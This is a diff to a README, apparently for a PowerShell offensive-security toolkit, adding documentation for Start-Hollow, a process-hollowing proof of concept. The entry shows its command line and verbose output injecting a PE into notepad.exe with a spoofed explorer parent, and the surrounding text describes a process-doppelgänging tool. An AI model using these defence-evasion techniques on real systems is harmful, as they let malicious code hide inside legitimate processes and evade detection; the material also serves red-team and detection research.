@@ -392,6 +392,39 @@ svchost              4556 Primary No       N/A                   MSEDGEWIN10\IEU
 
 ## pwnd
 
+### Start-Hollow
+
+This is a proof-of-concept for process hollowing. There is nothing new here except maybe the use of NtCreateProcessEx which has some advantages in that it offers a convenient way to set a parent process and avoids the bothersome Get/SetThreadContext. On the flipside CreateRemoteThreadEx/NtCreateThreadEx are pretty suspicious API's.
+
+```
+# Create a Hollow from a PE on disk with explorer as the parent.
+# x64 Win10 RS4
+C:\PS> Start-Hollow -Sponsor C:\Windows\System32\notepad.exe -Hollow C:\Some\PE.exe -ParentPID 8304 -Verbose
+VERBOSE: [?] A place where souls may mend your ailing mind..
+VERBOSE: [+] Opened file for access
+VERBOSE: [+] Created section from file handle
+VERBOSE: [+] Opened handle to the parent => explorer
+VERBOSE: [+] Created process from section
+VERBOSE: [+] Acquired PBI
+VERBOSE: [+] Sponsor architecture is x64
+VERBOSE: [+] Sponsor ImageBaseAddress => 7FF69E9F0000
+VERBOSE: [+] Allocated space for the Hollow process
+VERBOSE: [+] Duplicated Hollow PE headers to the Sponsor
+VERBOSE: [+] Duplicated .text section to the Sponsor
+VERBOSE: [+] Duplicated .rdata section to the Sponsor
+VERBOSE: [+] Duplicated .data section to the Sponsor
+VERBOSE: [+] Duplicated .pdata section to the Sponsor
+VERBOSE: [+] Duplicated .rsrc section to the Sponsor
+VERBOSE: [+] Duplicated .reloc section to the Sponsor
+VERBOSE: [+] New process ImageBaseAddress => 40000000
+VERBOSE: [+] Created Hollow process parameters
+VERBOSE: [+] Allocated memory in the Hollow
+VERBOSE: [+] Process parameters duplicated into the Hollow
+VERBOSE: [+] Rewrote Hollow->PEB->pProcessParameters
+VERBOSE: [+] Created Hollow main thread..
+True
+```
+
 ### Start-Eidolon
 
 This is a proof-of-concept for doppelgänging, which was recently presented by enSilo at BlackHat EU. In simple terms this process involves creating an NTFS transaction from a file on disk (any file will do). Next we overwrite the file in memory, create a section from the modified file and launch a process based on that section. Afterwards we roll back the transaction, leaving the original file unchanged but we end up with a process that appears to be backed by the original file. For a more complete description please review the reference in the script.
